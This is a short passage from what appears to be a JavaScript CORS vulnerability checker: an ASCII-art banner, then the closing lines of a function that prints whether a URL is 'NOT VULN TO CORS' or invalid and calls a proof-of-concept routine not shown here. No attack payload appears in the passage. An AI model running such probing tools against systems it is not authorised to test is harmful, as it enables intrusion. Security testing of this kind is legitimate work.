⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⢸⣇⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⢿⠀⠀⢸⡇⠀⠀⠀⢰⡀⠀⠀⠀⠀⠀⠀⠘⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢸⣧⠀⠸⣿⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⣿⡀⠀⣿⡄⠀⠀⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⢹⣇⠀⢹⣇⠀⠀⠀⠀⠸⡆⠀⠀⠀⠀⠀⠀⠀⠈⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⣿⡄⠀⢿⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡆⠀⠀⠀⢹⣇⠀⢸⡇⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠘⣿⠀⠀⣇⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⢻⡇⠀⠘⡆⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⢸⣿⠀⠀⢧⠀⠀⠀⠀⠀⠘⣿⡄⠀⠀⣀⣴⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣀⣀⣠⣤⣼⣿⡀⠀⠀⠀⠀⠀⠀⢀⣠⣾⡟⣉⣉⣩⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⢁⣠⠴⣿⠛⠛⠛⠛⣿⡛⠛⢻⠟⢻⠉⠀⠀⢀⣸⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡤⢶⡯⢥⣀⣹⣄⣠⠤⢞⣩⠷⣶⣉⣀⣨⣷⠶⠚⠉⠁⣹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣧⣤⡤⢽⣧⣤⠤⢿⢤⣴⣿⣤⣤⣤⣿⣤⣤⣼⡦⠤⠴⡶⣿⡇⠀⠀⠀⠀⠀⠀⠀


`,'\x1b[0m');


	console.log(" %s NOT VULN TO CORS.",URL)


	poc();
	}
    }catch{
        console.log("INVALID URL >> %s.",URL)
    }
}()
